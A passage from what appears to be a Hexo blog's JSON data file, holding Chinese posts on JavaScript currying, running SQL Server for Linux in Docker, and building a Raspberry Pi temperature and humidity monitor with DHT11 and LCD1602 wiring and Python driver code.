x+y;</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>测试一下！通过执行<code>add(1)(2)</code>，果然返回了<code>3</code>，是的，这是一个手动构造柯里化函数的过程。对于大多数函数，我们有通用的柯里化方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">curry</span>(<span class=\"params\">func</span>) </span>&#123;</div><div class=\"line\">  <span class=\"keyword\">var</span> fixedArgs = [].slice.call(<span class=\"built_in\">arguments</span>,<span class=\"number\">1</span>);</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    args = fixedArgs.concat([].slice.call(<span class=\"built_in\">arguments</span>))</div><div class=\"line\">    <span class=\"keyword\">return</span> func.apply(<span class=\"literal\">null</span>, args);</div><div class=\"line\">  &#125;;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>也就是说，对于<code>add</code>函数来说，我们用一个函数生成了另一个范围更小的函数，一层接一层的解决问题。这符合函数式编程的思想，就是我们更关注<strong>函数</strong>与<strong>函数</strong>之间的关系，而非状态本身，更在乎局部而非整体。</p>\n<p>这个例子体现不出这种思想的精妙之处，那么我们再举一个例子🌰</p>\n<p>如果，我们想让一个已知的数组每个值都做加1操作，传统的方法该怎么做？</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">let</span> ar = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</div><div class=\"line\">ar.map(<span class=\"function\">(<span class=\"params\">x</span>)=&gt;</span> x+<span class=\"number\">1</span>);</div></pre></td></tr></table></figure>\n<p>对吧？那么我们下面可以用柯里化的思想把这个问题实现：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">const</span> add = <span class=\"function\"><span class=\"params\">ar</span> =&gt;</span> ar.map(<span class=\"function\"><span class=\"params\">x</span> =&gt;</span> x + <span class=\"number\">1</span>);</div><div class=\"line\">add([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]);</div></pre></td></tr></table></figure>\n<p>首先我们在<code>add</code>里定义了一个函数，并且传入参数为<code>ar</code>，<code>ar</code>进行<code>Array.prototype.map()</code>操作，对每一个数进行遍历，并且返回这个数字+1后的值给<code>ar</code>，这看起来挺玄乎的，但确实可行，我们只关心局部，请试图把<code>add</code>当做数学里中的函数去思考理解，或许会好懂的多。可是这只是方便了我们理解，那么到底有什么好处呢？</p>\n<p>再举一个例子🌰</p>\n<p>如果我们想写一个函数，用来对已知数组的已知量进行相加n的操作，怎么写？传统方法</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">let</span> ar= [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>];</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addToArray</span>(<span class=\"params\">ar,n</span>)</span>&#123;</div><div class=\"line\">  <span class=\"keyword\">return</span> ar.map(<span class=\"function\">(<span class=\"params\">x</span>)=&gt;</span> x+n)</div><div class=\"line\">&#125;;</div><div class=\"line\"><span class=\"built_in\">console</span>.log(addToArray(ar,<span class=\"number\">1</span>));</div></pre></td></tr></table></figure>\n<p>但是，我们可以这样写：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">const</span> add = <span class=\"function\"><span class=\"params\">a</span> =&gt;</span> b =&gt; a+b;</div><div class=\"line\"><span class=\"keyword\">const</span> addToArray = <span class=\"function\">(<span class=\"params\">ar,n</span>) =&gt;</span> ar.map(add(n));</div><div class=\"line\">addToArray([<span class=\"number\">2</span>,<span class=\"number\">3</span>],<span class=\"number\">1</span>)</div></pre></td></tr></table></figure>\n<p>结果都一样，其实过程是不一样的，你可能真的憋不住了，到底有什么用呢？</p>\n<h1 id=\"柯里化的好处\"><a href=\"#柯里化的好处\" class=\"headerlink\" title=\"柯里化的好处\"></a>柯里化的好处</h1><p>就像上面的例子一样，你能看出不同吗？对，第一个的实质是新写了一个函数，对数组进行map操作，而第二个则是在直接在<code>map</code>里进行<code>add</code>操作，这很通用，一旦你写了很多类似于<code>add</code>的函数，就会方便起来，可以让我们方便的在<code>map</code>,<code>reduce</code>,<code>filter</code>里调用。</p>\n<ul>\n<li>能够进行延迟计算，就像add(1)(2)一样，1比2先传入，2就会被延迟计算，在特定的场景里，有一定的应用意义。</li>\n<li>当你发现你要调用一个函数，并且调用参数都是一样的情况下，这个参数就可以被柯里化，以便更好的完成任务。</li>\n<li>优雅的写法，允许你写出来的代码更干净、更有表达力。</li>\n</ul>\n<p>虽然柯里化在日常应用不多，但仍然是一个不可不了解的好概念。</p>\n<h1 id=\"相关阅读\"><a href=\"#相关阅读\" class=\"headerlink\" title=\"相关阅读\"></a>相关阅读</h1><p><a href=\"https://cnodejs.org/topic/56261a249b48ca9448b776c4\"> JavaScript柯里化</a></p>\n<p><a href=\"http://codekirei.com/posts/currying-with-arrow-functions/\">Currying and ES6 Arrow Functions</a></p>\n<p><a href=\"http://www.cnblogs.com/zztt/p/4142891.html\">浅析 JavaScript 中的 函数 currying 柯里化</a></p>\n<p><a href=\"https://www.youtube.com/watch?v=iZLP4qOwY8I\">Currying - Part 6 of Functional Programming in JavaScript(需梯子)</a></p>\n"},{"title":"Docker下配置SQL Server for Linux","date":"2016-11-22T14:44:06.000Z","_content":"\n# 前言\n\n微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。\n\nCanonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」\n\n<!--more -->\n![](/content/images/sqldocker/micosoft.png)\n# 配置要求\n\n* Docker版本在 1.8 以上\n* 至少 4GB 硬盘空间\n* 至少 4GB 内存\n\n![](/content/images/sqldocker/0.jpg)\n\n# 配置\n## 拉取docker镜像\n```\ndocker pull microsoft/mssql-server-linux\n```\n## 运行docker镜像\n\n``YourStrong!Passw0rd`` 为你的密码\n\n``1433`` 为对外端口\n```\n docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -d microsoft/mssql-server-linux\n```\n🌰 例子\n```\nsudo docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -d microsoft/mssql-server-linux\n```\n\n\n## 设置 宿主机保存数据目录(暂不支持)\n\n``<host directory>`` 为目录\n\n```\ndocker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -v <host directory>:/var/opt/mssql -d microsoft/mssql-server-linux\n```\n\n## 查看容器的ip(调试用)\n```\ndocker inspect --format='{{.NetworkSettings.IPAddress}}' 容器id\n```\n172.17.0.2\n\n# 连接\n用户名是SA\n\n密码是用户自己设置的\n\n![](/content/images/sqldocker/1.jpg)\n\n连接成功！\n\n![](/content/images/sqldocker/2.jpg)\n\n# 最后\n\n内存占用情况\n\n![](/content/images/sqldocker/3.jpg)\n\n\n我们一起默念** 微软大法好 ** ** 微软大法好 ** ** 微软大法好 ** 。\n\n谢谢微软为开源世界做的一切！\n\n# 参考\nhttps://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker\n\n","source":"_posts/在Docker下的Ubuntu安装Sql-Server-for-Linux.md","raw":"---\ntitle: Docker下配置SQL Server for Linux\ndate: 2016-11-22 14:44:06\ntags: \n- Docker \n- SQLserver\npermalink: docker-SQLServer\ncategories: Docker\n---\n\n# 前言\n\n微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。\n\nCanonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」\n\n<!--more -->\n![](/content/images/sqldocker/micosoft.png)\n# 配置要求\n\n* Docker版本在 1.8 以上\n* 至少 4GB 硬盘空间\n* 至少 4GB 内存\n\n![](/content/images/sqldocker/0.jpg)\n\n# 配置\n## 拉取docker镜像\n```\ndocker pull microsoft/mssql-server-linux\n```\n## 运行docker镜像\n\n``YourStrong!Passw0rd`` 为你的密码\n\n``1433`` 为对外端口\n```\n docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -d microsoft/mssql-server-linux\n```\n🌰 例子\n```\nsudo docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -d microsoft/mssql-server-linux\n```\n\n\n## 设置 宿主机保存数据目录(暂不支持)\n\n``<host directory>`` 为目录\n\n```\ndocker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=<YourStrong!Passw0rd>' -p 1433:1433 -v <host directory>:/var/opt/mssql -d microsoft/mssql-server-linux\n```\n\n## 查看容器的ip(调试用)\n```\ndocker inspect --format='{{.NetworkSettings.IPAddress}}' 容器id\n```\n172.17.0.2\n\n# 连接\n用户名是SA\n\n密码是用户自己设置的\n\n![](/content/images/sqldocker/1.jpg)\n\n连接成功！\n\n![](/content/images/sqldocker/2.jpg)\n\n# 最后\n\n内存占用情况\n\n![](/content/images/sqldocker/3.jpg)\n\n\n我们一起默念** 微软大法好 ** ** 微软大法好 ** ** 微软大法好 ** 。\n\n谢谢微软为开源世界做的一切！\n\n# 参考\nhttps://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker\n\n","slug":"docker-SQLServer","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xox002i5es5hihxfush","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。</p>\n<p>Canonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」</p>\n<a id=\"more\"></a>\n<p><img src=\"/content/images/sqldocker/micosoft.png\" alt=\"\"></p>\n<h1 id=\"配置要求\"><a href=\"#配置要求\" class=\"headerlink\" title=\"配置要求\"></a>配置要求</h1><ul>\n<li>Docker版本在 1.8 以上</li>\n<li>至少 4GB 硬盘空间</li>\n<li>至少 4GB 内存</li>\n</ul>\n<p><img src=\"/content/images/sqldocker/0.jpg\" alt=\"\"></p>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><h2 id=\"拉取docker镜像\"><a href=\"#拉取docker镜像\" class=\"headerlink\" title=\"拉取docker镜像\"></a>拉取docker镜像</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker pull microsoft/mssql-server-linux</div></pre></td></tr></table></figure>\n<h2 id=\"运行docker镜像\"><a href=\"#运行docker镜像\" class=\"headerlink\" title=\"运行docker镜像\"></a>运行docker镜像</h2><p><code>YourStrong!Passw0rd</code> 为你的密码</p>\n<p><code>1433</code> 为对外端口<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>\n<p>🌰 例子<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>\n<h2 id=\"设置-宿主机保存数据目录-暂不支持\"><a href=\"#设置-宿主机保存数据目录-暂不支持\" class=\"headerlink\" title=\"设置 宿主机保存数据目录(暂不支持)\"></a>设置 宿主机保存数据目录(暂不支持)</h2><p><code>&lt;host directory&gt;</code> 为目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -v &lt;host directory&gt;:/var/opt/mssql -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure>\n<h2 id=\"查看容器的ip-调试用\"><a href=\"#查看容器的ip-调试用\" class=\"headerlink\" title=\"查看容器的ip(调试用)\"></a>查看容器的ip(调试用)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker inspect --format=&apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; 容器id</div></pre></td></tr></table></figure>\n<p>172.17.0.2</p>\n<h1 id=\"连接\"><a href=\"#连接\" class=\"headerlink\" title=\"连接\"></a>连接</h1><p>用户名是SA</p>\n<p>密码是用户自己设置的</p>\n<p><img src=\"/content/images/sqldocker/1.jpg\" alt=\"\"></p>\n<p>连接成功！</p>\n<p><img src=\"/content/images/sqldocker/2.jpg\" alt=\"\"></p>\n<h1 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h1><p>内存占用情况</p>\n<p><img src=\"/content/images/sqldocker/3.jpg\" alt=\"\"></p>\n<p>我们一起默念<strong> 微软大法好 </strong> <strong> 微软大法好 </strong> <strong> 微软大法好 </strong> 。</p>\n<p>谢谢微软为开源世界做的一切！</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker\" target=\"_blank\" rel=\"external\">https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker</a></p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。</p>\n<p>Canonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」</p>","more":"<p><img src=\"/content/images/sqldocker/micosoft.png\" alt=\"\"></p>\n<h1 id=\"配置要求\"><a href=\"#配置要求\" class=\"headerlink\" title=\"配置要求\"></a>配置要求</h1><ul>\n<li>Docker版本在 1.8 以上</li>\n<li>至少 4GB 硬盘空间</li>\n<li>至少 4GB 内存</li>\n</ul>\n<p><img src=\"/content/images/sqldocker/0.jpg\" alt=\"\"></p>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><h2 id=\"拉取docker镜像\"><a href=\"#拉取docker镜像\" class=\"headerlink\" title=\"拉取docker镜像\"></a>拉取docker镜像</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker pull microsoft/mssql-server-linux</div></pre></td></tr></table></figure>\n<h2 id=\"运行docker镜像\"><a href=\"#运行docker镜像\" class=\"headerlink\" title=\"运行docker镜像\"></a>运行docker镜像</h2><p><code>YourStrong!Passw0rd</code> 为你的密码</p>\n<p><code>1433</code> 为对外端口<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>\n<p>🌰 例子<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure></p>\n<h2 id=\"设置-宿主机保存数据目录-暂不支持\"><a href=\"#设置-宿主机保存数据目录-暂不支持\" class=\"headerlink\" title=\"设置 宿主机保存数据目录(暂不支持)\"></a>设置 宿主机保存数据目录(暂不支持)</h2><p><code>&lt;host directory&gt;</code> 为目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker run -e &apos;ACCEPT_EULA=Y&apos; -e &apos;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&apos; -p 1433:1433 -v &lt;host directory&gt;:/var/opt/mssql -d microsoft/mssql-server-linux</div></pre></td></tr></table></figure>\n<h2 id=\"查看容器的ip-调试用\"><a href=\"#查看容器的ip-调试用\" class=\"headerlink\" title=\"查看容器的ip(调试用)\"></a>查看容器的ip(调试用)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">docker inspect --format=&apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; 容器id</div></pre></td></tr></table></figure>\n<p>172.17.0.2</p>\n<h1 id=\"连接\"><a href=\"#连接\" class=\"headerlink\" title=\"连接\"></a>连接</h1><p>用户名是SA</p>\n<p>密码是用户自己设置的</p>\n<p><img src=\"/content/images/sqldocker/1.jpg\" alt=\"\"></p>\n<p>连接成功！</p>\n<p><img src=\"/content/images/sqldocker/2.jpg\" alt=\"\"></p>\n<h1 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h1><p>内存占用情况</p>\n<p><img src=\"/content/images/sqldocker/3.jpg\" alt=\"\"></p>\n<p>我们一起默念<strong> 微软大法好 </strong> <strong> 微软大法好 </strong> <strong> 微软大法好 </strong> 。</p>\n<p>谢谢微软为开源世界做的一切！</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker\">https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker</a></p>"},{"title":"基于树莓派的实时温度湿度监测平台","id":"15","updated":"2016-08-25T18:28:59.000Z","date":"2016-08-25T12:39:08.000Z","_content":"\n\n# 前言\n很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。\n\n在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。\n<!-- more --> \n# 知识储备\n* 数字电子技术基础\n* 微机原理与接口技术\n* python语言\n\n# 原料\n* 树莓派3B\n* DHT11\n* LCD1602\n* 2K电阻（也可以是电位器）\n* 子-母 和 母-母 杜邦线\n* 电气绝缘胶带\n* 剪刀\n* 一颗耐心和一颗细心\n\n# 语言\n* Python 2.7\n\n# 组件\n* python-dev\n* python-rpi.gpio\n如果不具备以上，请执行：\n```bash\nsudo apt-get update\nsudo apt-get install python-dev\nsudo apt-get install python-rpi.gpio\n```\n\n# 接线\n我们一共要完成两个任务：\n\n* 1.连接LCD1602\n* 2.连接DHT11\n\n树莓派3B的GPIO图如下：\n\n![](/content/images/2016/08/GPIO.png)\n##  2K 电阻如何连接到电路\n简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。\n\n## LCD1602 接线方案\n\nLCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：\n![](/content/images/2016/08/LCD1602--.jpg)\n\n树莓派的USB端口朝下，电源线位置朝上方向摆放。\n右端一共有40个引脚，每个引脚的PIN位置如上。\n\nVSS，接地，RPi PIN 6\nVDD，接5V电源，PRi PIN 2\nVO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9\nRS，寄存器选择，接GPIO 14，RPi PIN 8\nRW，读写选择，接地，表示写模式，PRi PIN 6\nE，使能信号，接GPIO 15，RPi PIN 10\nD0，数据位0，4位工作模式下不用，不接\nD1，数据位1，4位工作模式下不用，不接\nD2，数据位2，4位工作模式下不用，不接\nD3，数据位3，4位工作模式下不用，不接\nD4，数据位4，接GPIO 17，RPi PIN 11\nD5，数据位5，接GPIO 18，RPi PIN 12\nD6，数据位6，接GPIO 27，RPi PIN 13\nD7，数据位7，接GPIO 22，RPi PIN 15\nA，液晶屏背光+，接5V，RPi PIN 4\nK，液晶屏背光-，接地，RPi PIN 39\n\n**连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。**\n\n建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。\n\n## LCD1602 开机测试\n接通电源线，默认情况下，如果连接正确：\n\n* 肯定没有爆炸\n* 会出现如下图的效果，证明你已经接线成功了\n![](/content/images/2016/08/1.jpg)\n\n## DHT11 接线方案\n接线简单，主要是把数据传输到GPIO26上\n\nDHT11有3个脚，VCC，DATA，GND\nVCC 接 3.3V PIN 01\nDATA 接 GPIO26 PIN 37\nGND 接地  PIN 09\n\n#代码\n采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github\n\nhttps://github.com/yfgeek/rpi-TmpHmdRuntime\n```python\n#!/usr/bin/python\n\n# based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527\n# rewrite by ivan\n\nfrom time import sleep\nfrom datetime import datetime\nfrom time import sleep\nimport commands,time\nimport RPi.GPIO as GPIO\n\ndef get_tmp():\n  channel = 37\n  data = []\n  j = 0\n\n  GPIO.setmode(GPIO.BOARD)\n\n  time.sleep(1)\n\n  GPIO.setup(channel, GPIO.OUT)\n  GPIO.output(channel, GPIO.LOW)\n  time.sleep(0.5)\n  GPIO.output(channel, GPIO.HIGH)\n  GPIO.setup(channel, GPIO.IN)\n\n  while GPIO.input(channel) == GPIO.LOW:\n    continue\n  while GPIO.input(channel) == GPIO.HIGH:\n    continue\n\n  while j < 40:\n    k = 0\n    while GPIO.input(channel) == GPIO.LOW:\n      continue\n    while GPIO.input(channel) == GPIO.HIGH:\n      k += 1\n      if k > 100:\n        break\n    if k < 8:\n      data.append(0)\n    else:\n      data.append(1)\n\n    j += 1\n\n  print \"sensor is working.\"\n  print data\n\n  humidity_bit = data[0:8]\n  humidity_point_bit = data[8:16]\n  temperature_bit = data[16:24]\n  temperature_point_bit = data[24:32]\n  check_bit = data[32:40]\n\n  humidity = 0\n  humidity_point = 0\n  temperature = 0\n  temperature_point = 0\n  check = 0\n\n  for i in range(8):\n    humidity += humidity_bit[i] * 2 ** (7-i)\n    humidity_point += humidity_point_bit[i] * 2 ** (7-i)\n    temperature += temperature_bit[i] * 2 ** (7-i)\n    temperature_point += temperature_point_bit[i] * 2 ** (7-i)\n    check += check_bit[i] * 2 ** (7-i)\n\n  tmp = humidity + humidity_point + temperature + temperature_point\n\n  if check == tmp:\n    return 'temp:' + str(temperature) + ' C \\nhumidity:' + str(humidity) + '%'\n  else:\n    get_tmp()\n\n  GPIO.cleanup()    \n\nclass Adafruit_CharLCD:\n\n    # commands\n    LCD_CLEARDISPLAY            = 0x01\n    LCD_RETURNHOME                  = 0x02\n    LCD_ENTRYMODESET            = 0x04\n    LCD_DISPLAYCONTROL          = 0x08\n    LCD_CURSORSHIFT             = 0x10\n    LCD_FUNCTIONSET             = 0x20\n    LCD_SETCGRAMADDR            = 0x40\n    LCD_SETDDRAMADDR            = 0x80\n\n    # flags for display entry mode\n    LCD_ENTRYRIGHT              = 0x00\n    LCD_ENTRYLEFT               = 0x02\n    LCD_ENTRYSHIFTINCREMENT     = 0x01\n    LCD_ENTRYSHIFTDECREMENT     = 0x00\n\n    # flags for display on/off control\n    LCD_DISPLAYON               = 0x04\n    LCD_DISPLAYOFF              = 0x00\n    LCD_CURSORON                = 0x02\n    LCD_CURSOROFF               = 0x00\n    LCD_BLINKON                 = 0x01\n    LCD_BLINKOFF                = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n    LCD_MOVERIGHT               = 0x04\n    LCD_MOVELEFT                = 0x00\n\n    # flags for function set\n    LCD_8BITMODE                = 0x10\n    LCD_4BITMODE                = 0x00\n    LCD_2LINE                   = 0x08\n    LCD_1LINE                   = 0x00\n    LCD_5x10DOTS                = 0x04\n    LCD_5x8DOTS                 = 0x00\n\n\n\n    def __init__(self, pin_rs=8, pin_e=10, pins_db=[11,12,13,15], GPIO = None):\n        # Emulate the old behavior of using RPi.GPIO if we haven't been given\n        # an explicit GPIO interface to use\n        if not GPIO:\n            import RPi.GPIO as GPIO\n        GPIO.setwarnings(False)\n\n        self.GPIO = GPIO\n        self.pin_rs = pin_rs\n        self.pin_e = pin_e\n        self.pins_db = pins_db\n\n        self.GPIO.setmode(GPIO.BOARD)\n        self.GPIO.setup(self.pin_e, GPIO.OUT)\n        self.GPIO.setup(self.pin_rs, GPIO.OUT)\n\n        for pin in self.pins_db:\n            self.GPIO.setup(pin, GPIO.OUT)\n\n        self.write4bits(0x33) # initialization\n        self.write4bits(0x32) # initialization\n        self.write4bits(0x28) # 2 line 5x7 matrix\n        self.write4bits(0x0C) # turn cursor off 0x0E to enable cursor\n        self.write4bits(0x06) # shift cursor right\n\n        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF\n\n        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS\n        self.displayfunction |= self.LCD_2LINE\n\n        \"\"\" Initialize to default text direction (for romance languages) \"\"\"\n        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) #  set the entry mode\n\n        self.clear()\n\n\n    def begin(self, cols, lines):\n\n        if (lines > 1):\n                self.numlines = lines\n                self.displayfunction |= self.LCD_2LINE\n                self.currline = 0\n\n\n    def home(self):\n\n        self.write4bits(self.LCD_RETURNHOME) # set cursor position to zero\n        self.delayMicroseconds(3000) # this command takes a long time!\n\n\n    def clear(self):\n\n        self.write4bits(self.LCD_CLEARDISPLAY) # command to clear display\n        self.delayMicroseconds(3000)    # 3000 microsecond sleep, clearing the display takes a long time\n\n\n    def setCursor(self, col, row):\n\n        self.row_offsets = [ 0x00, 0x40, 0x14, 0x54 ]\n\n        if ( row > self.numlines ): \n                row = self.numlines - 1 # we count rows starting w/0\n\n        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))\n\n\n    def noDisplay(self): \n        \"\"\" Turn the display off (quickly) \"\"\"\n\n        self.displaycontrol &= ~self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def display(self):\n        \"\"\" Turn the display on (quickly) \"\"\"\n\n        self.displaycontrol |= self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noCursor(self):\n        \"\"\" Turns the underline cursor on/off \"\"\"\n\n        self.displaycontrol &= ~self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def cursor(self):\n        \"\"\" Cursor On \"\"\"\n\n        self.displaycontrol |= self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def DisplayLeft(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)\n\n\n    def scrollDisplayRight(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        